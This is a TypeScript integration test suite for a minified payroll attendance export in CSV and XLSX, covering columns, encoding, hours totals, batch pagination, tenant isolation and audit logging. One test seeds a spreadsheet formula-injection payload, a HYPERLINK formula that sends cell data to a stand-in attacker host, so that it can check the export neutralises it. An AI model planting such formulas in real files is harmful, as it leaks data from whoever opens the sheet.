import { randomUUID } from 'node:crypto';
import { AttendanceStatus, ExportVariant, Role } from '@wasel/contracts';
import excel from 'exceljs';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { EXPORT_BATCH_SIZE } from '../../src/modules/admin/admin.constants.js';
import { AdminModule } from '../../src/modules/admin/admin.module.js';
import { TIMEZONE_CHANGED_NOTE } from '../../src/modules/admin/export/export-columns.js';
import { AuthModule } from '../../src/modules/auth/auth.module.js';
import { seedAttendanceRecord, seedSite } from '../fixtures/admin-fixtures.js';
import {
  createTestApp,
  createUser,
  createUserAndLogin,
  type AuthenticatedActor,
  type TestApp,
} from '../support/index.js';

/**
 * The minified attendance sheet — the payroll extract.
 *
 * A second column set on the same route, which is exactly why it needs its own
 * coverage rather than an assertion bolted onto the detailed suite: everything
 * the export path is careful about is shared code, and shared code is precisely
 * what a second caller can reach through an untested path. The keyset cursor, the
 * CSV-injection rule, the byte-order mark and the per-batch socket wait are all
 * one implementation now, so each of them is exercised here through the variant
 * that did not exist when they were written.
 *
 * Every export test here crosses **more than one batch**. A suite whose fixtures
 * fit inside the first 500 rows exercises none of the pagination it exists to
 * protect, and `(workDate, userId)` is the only thing standing between a payroll
 * extract and a duplicated or dropped row.
 */

const RIYADH = 'Asia/Riyadh';

/** 1-based spreadsheet columns of the minified sheet. */
const WORK_DATE_COLUMN = 1;
const EMPLOYEE_COLUMN = 2;
const CHECK_IN_COLUMN = 3;
const CHECK_OUT_COLUMN = 4;
const HOURS_COLUMN = 5;

const CHECK_IN_UTC = 'T05:15:00.000Z';
const CHECK_OUT_UTC = 'T14:30:00.000Z';
const WALL_CLOCK_IN = '08:15';
const WALL_CLOCK_OUT = '17:30';

/** Enough rows to cross the 500-row batch boundary twice over. */
const CROWD = 40;
const DAYS = 30;
const TOTAL_ROWS = CROWD * DAYS;
/** 9:15 — deliberately not a round number of hours, so `8` cannot pass by luck. */
const WORKED_MINUTES = 555;

interface Sheet {
  header: string[];
  rows: string[][];
}

/** `YYYY-MM-DD` for day `index` of March 2026. */
function workDay(index: number): string {
  const date = new Date(Date.UTC(2026, 2, 1 + index));
  return date.toISOString().slice(0, 10);
}

function parseCsv(text: string): Sheet {
  const body = text.startsWith('﻿') ? text.slice(1) : text;
  const lines = body.split('\r\n').filter((line) => line !== '');
  const split = (line: string): string[] => {
    const cells: string[] = [];
    let cell = '';
    let quoted = false;
    for (let i = 0; i < line.length; i += 1) {
      const char = line[i];
      if (quoted) {
        if (char === '"' && line[i + 1] === '"') {
          cell += '"';
          i += 1;
        } else if (char === '"') quoted = false;
        else cell += char;
      } else if (char === '"') quoted = true;
      else if (char === ',') {
        cells.push(cell);
        cell = '';
      } else cell += char;
    }
    cells.push(cell);
    return cells;
  };
  return { header: split(lines[0] ?? ''), rows: lines.slice(1).map(split) };
}

async function loadWorkbook(buffer: Buffer): Promise<excel.Workbook> {
  // `PK\x03\x04`: proof the response is a zip container before anything tries to
  // interpret it, so a corrupt download fails with something legible.
  expect(buffer.subarray(0, 4).toString('latin1')).toBe('PK\x03\x04');
  const workbook = new excel.Workbook();
  await workbook.xlsx.load(buffer);
  return workbook;
}

function cellText(value: excel.CellValue): string {
  if (value === null || value === undefined) return '';
  if (value instanceof Date) return value.toISOString();
  if (typeof value === 'number' || typeof value === 'boolean') return String(value);
  if (typeof value === 'string') return value;
  return 'text' in value ? String(value.text) : JSON.stringify(value);
}

describe('minified attendance export', () => {
  let ctx: TestApp;
  let admin: AuthenticatedActor;
  let siteId: string;

  beforeAll(async () => {
    ctx = await createTestApp({
      imports: [AuthModule, AdminModule],
      env: { RATE_LIMIT_MAX: '100000' },
    });
  });
  afterAll(async () => {
    await ctx.close();
  });
  beforeEach(async () => {
    await ctx.truncate();
    admin = await createUserAndLogin(ctx, {
      role: Role.ADMIN,
      organization: { timezone: RIYADH },
    });
    siteId = (await seedSite(ctx, admin.organization.id, { name: 'Head Office' })).id;
  });

  /**
   * `CROWD` employees × `DAYS` days.
   *
   * Several employees share each `workDate` on purpose: the export orders by
   * `(workDate, userId)`, so a fixture with one row per day would let a cursor
   * that ignored the `userId` tie-break pass. Here a batch boundary lands in the
   * middle of a day, which is exactly where a broken keyset drops or repeats a
   * row.
   */
  async function seedCrowd(): Promise<void> {
    const organizationId = admin.organization.id;
    const passwordHash = 'not-a-real-hash-these-users-never-sign-in';
    const users = Array.from({ length: CROWD }, (_, i) => ({
      id: randomUUID(),
      organizationId,
      email: `payroll-${String(i).padStart(3, '0')}@wasel.test`,
      passwordHash,
      fullName: `Payroll Member ${String(i).padStart(3, '0')}`,
      employeeCode: `PAY-${String(i).padStart(3, '0')}`,
      role: Role.MEMBER,
    }));
    await ctx.prisma.user.createMany({ data: users });

    const records = users.flatMap((user) =>
      Array.from({ length: DAYS }, (_, day) => {
        const date = workDay(day);
        return {
          organizationId,
          userId: user.id,
          workDate: new Date(`${date}T00:00:00.000Z`),
          checkInAt: new Date(`${date}${CHECK_IN_UTC}`),
          checkInSiteId: siteId,
          checkInLatitude: 24.7136,
          checkInLongitude: 46.6753,
          checkInAccuracyM: 12,
          checkInDistanceM: 20,
          checkOutAt: new Date(`${date}${CHECK_OUT_UTC}`),
          checkOutSiteId: siteId,
          checkOutLatitude: 24.7136,
          checkOutLongitude: 46.6753,
          checkOutAccuracyM: 12,
          checkOutDistanceM: 20,
          status: AttendanceStatus.PRESENT,
          workedMinutes: WORKED_MINUTES,
          lateMinutes: 0,
        };
      }),
    );
    await ctx.prisma.attendanceRecord.createMany({ data: records });
  }

  const fullRange = `from=${workDay(0)}&to=${workDay(DAYS - 1)}`;
  const minified = `variant=${ExportVariant.MINIFIED}`;

  async function downloadCsv(query: string): Promise<Sheet> {
    const response = await admin
      .get(`/admin/reports/export?${query}&${minified}&format=csv`)
      .expect(200);
    return parseCsv(response.text);
  }

  async function downloadXlsx(query: string): Promise<excel.Workbook> {
    const response = await admin
      .get(`/admin/reports/export?${query}&${minified}&format=xlsx`)
      .responseType('blob')
      .expect(200);
    return loadWorkbook(response.body as Buffer);
  }

  describe('the sheet itself', () => {
    it('carries five columns and states the timezone on the two instants', async () => {
      await seedCrowd();

      const csv = await downloadCsv(fullRange);
      expect(csv.header).toEqual([
        'Work date',
        'Employee',
        `Check-in (${RIYADH})`,
        `Check-out (${RIYADH})`,
        'Total hours',
      ]);

      const sheet = (await downloadXlsx(fullRange)).getWorksheet('Attendance');
      const header = sheet?.getRow(1);
      expect(cellText(header?.getCell(CHECK_IN_COLUMN).value)).toBe(`Check-in (${RIYADH})`);
      expect(cellText(header?.getCell(HOURS_COLUMN).value)).toBe('Total hours');
      // Nothing past the fifth column: the autofilter and the widths stop there.
      expect(cellText(header?.getCell(HOURS_COLUMN + 1).value)).toBe('');
      // `A1:E1` — the filter stops at the fifth column, so a reader cannot filter
      // on a column this sheet does not have.
      expect(sheet?.autoFilter).toBe('A1:E1');
    });

    it('names the variant in the download, and leaves the detailed name alone', async () => {
      const minifiedResponse = await admin
        .get(`/admin/reports/export?${fullRange}&${minified}`)
        .responseType('blob')
        .expect(200);
      expect(minifiedResponse.headers['content-disposition']).toContain(
        `attendance-minified-${workDay(0)}_to_${workDay(DAYS - 1)}.xlsx`,
      );

      // A request that says nothing about the variant is still the sheet it has
      // always been, under the name it has always had.
      const detailed = await admin
        .get(`/admin/reports/export?${fullRange}`)
        .responseType('blob')
        .expect(200);
      expect(detailed.headers['content-disposition']).toContain(
        `attendance-${workDay(0)}_to_${workDay(DAYS - 1)}.xlsx`,
      );
      expect(detailed.headers['content-disposition']).not.toContain('minified');
    });

    it('opens as UTF-8 in Excel and keeps a non-Latin name intact', async () => {
      const employee = await createUser(ctx, {
        organizationId: admin.organization.id,
        fullName: 'أحمد الغامدي',
        employeeCode: 'AR-1',
      });
      const day = workDay(0);
      await seedAttendanceRecord(ctx, {
        organizationId: admin.organization.id,
        userId: employee.user.id,
        siteId,
        workDate: day,
      });

      const response = await admin
        .get(`/admin/reports/export?from=${day}&to=${day}&${minified}&format=csv`)
        .expect(200);
      // Without the mark Excel decodes the bytes as the machine's legacy code
      // page and the name arrives as `Ø§Ù„…`.
      expect(Buffer.from(response.text, 'utf8').subarray(0, 3)).toEqual(
        Buffer.from([0xef, 0xbb, 0xbf]),
      );
      expect(parseCsv(response.text).rows[0]?.[EMPLOYEE_COLUMN - 1]).toBe('أحمد الغامدي');

      const row = (await downloadXlsx(`from=${day}&to=${day}`))
        .getWorksheet('Attendance')
        ?.getRow(2);
      expect(cellText(row?.getCell(EMPLOYEE_COLUMN).value)).toBe('أحمد الغامدي');
    });

    it('neutralises a formula in an employee name in both formats', async () => {
      const hostile = '=HYPERLINK("http://evil.example/?"&A1,"Click")';
      const employee = await createUser(ctx, {
        organizationId: admin.organization.id,
        fullName: hostile,
        employeeCode: 'EV-1',
      });
      const day = workDay(0);
      await seedAttendanceRecord(ctx, {
        organizationId: admin.organization.id,
        userId: employee.user.id,
        siteId,
        workDate: day,
      });

      // Fewer columns is fewer places to get this wrong, not permission to: the
      // name is the payload's route into the file and it survives into this
      // sheet unchanged.
      const csv = await downloadCsv(`from=${day}&to=${day}`);
      expect(csv.rows[0]?.[EMPLOYEE_COLUMN - 1]).toBe(`'${hostile}`);

      const row = (await downloadXlsx(`from=${day}&to=${day}`))
        .getWorksheet('Attendance')
        ?.getRow(2);
      expect(cellText(row?.getCell(EMPLOYEE_COLUMN).value)).toBe(`'${hostile}`);
    });

    it('renders times as the local wall clock in both formats', async () => {
      const employee = await createUser(ctx, {
        organizationId: admin.organization.id,
        fullName: 'Wall Clock',
        employeeCode: 'WC-1',
      });
      const day = workDay(0);
      await seedAttendanceRecord(ctx, {
        organizationId: admin.organization.id,
        userId: employee.user.id,
        siteId,
        workDate: day,
        checkInAt: new Date(`${day}${CHECK_IN_UTC}`),
        checkOutAt: new Date(`${day}${CHECK_OUT_UTC}`),
      });

      const csv = await downloadCsv(`from=${day}&to=${day}`);
      expect(csv.rows[0]?.[WORK_DATE_COLUMN - 1]).toBe(day);
      expect(csv.rows[0]?.[CHECK_IN_COLUMN - 1]).toBe(`${day} ${WALL_CLOCK_IN}`);
      expect(csv.rows[0]?.[CHECK_OUT_COLUMN - 1]).toBe(`${day} ${WALL_CLOCK_OUT}`);

      const row = (await downloadXlsx(`from=${day}&to=${day}`))
        .getWorksheet('Attendance')
        ?.getRow(2);
      // Real date cells, so Excel sorts them chronologically and subtracting two
      // of them is a duration.
      expect(row?.getCell(WORK_DATE_COLUMN).value).toBeInstanceOf(Date);
      expect((row?.getCell(CHECK_IN_COLUMN).value as Date).toISOString()).toBe(
        `${day}T${WALL_CLOCK_IN}:00.000Z`,
      );
      expect((row?.getCell(CHECK_OUT_COLUMN).value as Date).toISOString()).toBe(
        `${day}T${WALL_CLOCK_OUT}:00.000Z`,
      );
    });

    it('leaves the hours blank while a shift is still open', async () => {
      const employee = await createUser(ctx, {
        organizationId: admin.organization.id,
        fullName: 'Still Working',
        employeeCode: 'SW-1',
      });
      const day = workDay(0);
      await seedAttendanceRecord(ctx, {
        organizationId: admin.organization.id,
        userId: employee.user.id,
        siteId,
        workDate: day,
        checkOutAt: null,
        workedMinutes: null,
      });

      const csv = await downloadCsv(`from=${day}&to=${day}`);
      // A zero is a claim that the person worked nothing, and it is summed as one.
      expect(csv.rows[0]?.[CHECK_OUT_COLUMN - 1]).toBe('');
      expect(csv.rows[0]?.[HOURS_COLUMN - 1]).toBe('');

      const row = (await downloadXlsx(`from=${day}&to=${day}`))
        .getWorksheet('Attendance')
        ?.getRow(2);
      expect(cellText(row?.getCell(HOURS_COLUMN).value)).toBe('');
    });
  });

  describe('total hours', () => {
    it('is a number the column can be summed on, not text that looks like one', async () => {
      await seedCrowd();

      const sheet = (await downloadXlsx(fullRange)).getWorksheet('Attendance');
      const first = sheet?.getRow(2).getCell(HOURS_COLUMN);
      expect(typeof first?.value).toBe('number');
      expect(first?.value).toBeCloseTo(WORKED_MINUTES / 60, 10);
      // The number format is what makes the number read as `9.25`; without it the
      // cell would show `9.25` only by accident of its digits.
      expect(sheet?.getColumn(HOURS_COLUMN).style.numFmt).toBe('0.00');

      // The property somebody actually exercises: select the column, read the
      // total. It must equal the range's real total, not a sum of rounded text.
      let total = 0;
      let counted = 0;
      sheet?.eachRow((row, number) => {
        if (number === 1) return;
        const value = row.getCell(HOURS_COLUMN).value;
        expect(typeof value).toBe('number');
        total += value as number;
        counted += 1;
      });
      expect(counted).toBe(TOTAL_ROWS);
      expect(total).toBeCloseTo((TOTAL_ROWS * WORKED_MINUTES) / 60, 6);

      // And it agrees with the Summary sheet, which states the same total in
      // minutes and in `h:mm`. Two answers in one workbook is a payroll dispute.
      const summary = new Map<string, string>();
      (await downloadXlsx(fullRange)).getWorksheet('Summary')?.eachRow((row) => {
        summary.set(cellText(row.getCell(1).value), cellText(row.getCell(2).value));
      });
      expect(summary.get('Total worked minutes')).toBe(String(TOTAL_ROWS * WORKED_MINUTES));
      expect(Number(summary.get('Total worked minutes')) / 60).toBeCloseTo(total, 6);
    });

    it('renders in the CSV exactly what the workbook displays', async () => {
      const employee = await createUser(ctx, {
        organizationId: admin.organization.id,
        fullName: 'Odd Minutes',
        employeeCode: 'OM-1',
      });
      const day = workDay(0);
      // 8:16 — a whole number of minutes that is not a whole hundredth of an hour.
      await seedAttendanceRecord(ctx, {
        organizationId: admin.organization.id,
        userId: employee.user.id,
        siteId,
        workDate: day,
        workedMinutes: 496,
      });

      expect((await downloadCsv(`from=${day}&to=${day}`)).rows[0]?.[HOURS_COLUMN - 1]).toBe('8.27');

      const value = (await downloadXlsx(`from=${day}&to=${day}`))
        .getWorksheet('Attendance')
        ?.getRow(2)
        .getCell(HOURS_COLUMN).value;
      // Exact underneath, `8.27` on screen: the CSV carries the rendering and the
      // workbook carries the arithmetic.
      expect(value).toBeCloseTo(496 / 60, 12);
      expect(value).not.toBe(8.27);
    });
  });

  describe('streaming', () => {
    it('emits every row exactly once across batch boundaries', async () => {
      await seedCrowd();
      expect(TOTAL_ROWS).toBeGreaterThan(EXPORT_BATCH_SIZE * 2);

      const csv = await downloadCsv(fullRange);
      expect(csv.rows).toHaveLength(TOTAL_ROWS);

      // `(workDate, employee)` is unique per row here, so a duplicated or dropped
      // cursor position shows up as a count mismatch rather than as a
      // plausible-looking sheet.
      const keys = csv.rows.map((row) => `${row[0]}/${row[1]}`);
      expect(new Set(keys).size).toBe(TOTAL_ROWS);

      const expected = await ctx.prisma.attendanceRecord.findMany({
        where: { organizationId: admin.organization.id },
        select: { workDate: true, user: { select: { fullName: true } } },
      });
      expect(new Set(keys)).toEqual(
        new Set(
          expected.map((row) => `${row.workDate.toISOString().slice(0, 10)}/${row.user.fullName}`),
        ),
      );

      // Ordered oldest first, and non-decreasing straight through the 500/501 and
      // 1000/1001 boundaries where a keyset bug lives.
      const dates = csv.rows.map((row) => row[0] ?? '');
      expect([...dates].sort((a, b) => a.localeCompare(b))).toEqual(dates);
      for (const boundary of [EXPORT_BATCH_SIZE, EXPORT_BATCH_SIZE * 2]) {
        expect(keys[boundary - 1]).not.toBe(keys[boundary]);
      }
    });

    it('writes the same rows into the workbook, and Excel can read them back', async () => {
      await seedCrowd();

      const sheet = (await downloadXlsx(fullRange)).getWorksheet('Attendance');
      // The header plus one row per record, and not one more.
      expect(sheet?.rowCount).toBe(TOTAL_ROWS + 1);

      const keys = new Set<string>();
      sheet?.eachRow((row, number) => {
        if (number === 1) return;
        keys.add(
          `${cellText(row.getCell(WORK_DATE_COLUMN).value)}/${cellText(
            row.getCell(EMPLOYEE_COLUMN).value,
          )}`,
        );
      });
      expect(keys.size).toBe(TOTAL_ROWS);
    });

    it('produces a valid one-row file for an empty range', async () => {
      const csv = await downloadCsv('from=2026-01-01&to=2026-01-31');
      expect(csv.rows).toHaveLength(0);
      expect(csv.header[0]).toBe('Work date');

      const workbook = await downloadXlsx('from=2026-01-01&to=2026-01-31');
      expect(workbook.getWorksheet('Attendance')?.rowCount).toBe(1);
      expect(workbook.getWorksheet('Summary')).toBeDefined();
    });

    it("never exports another tenant's rows", async () => {
      await seedCrowd();
      const other = await createUserAndLogin(ctx, {
        role: Role.ADMIN,
        organization: { timezone: RIYADH },
      });

      const response = await other
        .get(`/admin/reports/export?${fullRange}&${minified}&format=csv`)
        .expect(200);
      expect(parseCsv(response.text).rows).toHaveLength(0);
    });

    it('records which sheet was taken, not merely which file extension', async () => {
      await seedCrowd();
      await downloadCsv(fullRange);

      const rows = await waitForAudit(ctx, admin.organization.id, 'admin.report.exported');
      const finished = rows.find((row) => row.action === 'admin.report.exported');
      // The two variants carry different amounts of an employee's day, so "which
      // one left the building" is a question the audit trail has to be able to
      // answer after the fact.
      expect(finished?.metadata).toMatchObject({
        variant: ExportVariant.MINIFIED,
        format: 'csv',
        rows: TOTAL_ROWS,
      });
    });

    it('rejects a variant it does not produce', async () => {
      await admin
        .get(`/admin/reports/export?${fullRange}&variant=summary`)
        .expect(400)
        .expect((res) => expect(res.body.code).toBe('VALIDATION_FAILED'));
    });
  });

  /**
   * The warning the detailed sheet carries, on the sheet with fewer places to put
   * it. `workDate` is frozen at punch time; every instant is rendered in the
   * tenant's *current* zone. After a move the two disagree, and a payroll reader
   * comparing this file against the copy they were paid from deserves to be told.
   */
  it('warns in the header when the zone moved after these records were made', async () => {
    const employee = await createUser(ctx, {
      organizationId: admin.organization.id,
      fullName: 'Moved Zone',
      employeeCode: 'MZ-1',
    });
    const day = workDay(0);
    await seedAttendanceRecord(ctx, {
      organizationId: admin.organization.id,
      userId: employee.user.id,
      siteId,
      workDate: day,
    });
    await ctx.prisma.auditLog.create({
      data: {
        organizationId: admin.organization.id,
        actorId: admin.user.id,
        action: 'admin.organization.timezone_changed',
        entityType: 'Organization',
        metadata: { previousTimezone: 'Asia/Dubai', timezone: RIYADH },
        createdAt: new Date(`${workDay(2)}T09:00:00.000Z`),
      },
    });

    const csv = await downloadCsv(`from=${day}&to=${workDay(5)}`);
    expect(csv.header.filter((header) => header.includes(TIMEZONE_CHANGED_NOTE))).toHaveLength(2);
    expect(csv.header[WORK_DATE_COLUMN - 1]).toBe('Work date');
  });
});

/**
 * Polled rather than awaited: the export owns the response and ends it before the
 * completion row is written, so the request can return a moment ahead of the
 * audit insert.
 */
async function waitForAudit(
  ctx: TestApp,
  organizationId: string,
  action: string,
): Promise<Array<{ action: string; metadata: unknown; createdAt: Date }>> {
  for (let attempt = 0; attempt < 50; attempt += 1) {
    const rows = await ctx.prisma.auditLog.findMany({
      where: { organizationId },
      select: { action: true, metadata: true, createdAt: true },
      orderBy: { createdAt: 'asc' },
    });
    if (rows.some((row) => row.action === action)) return rows;
    await new Promise((resolve) => setTimeout(resolve, 20));
  }
  throw new Error(`No \`${action}\` audit row appeared`);
}
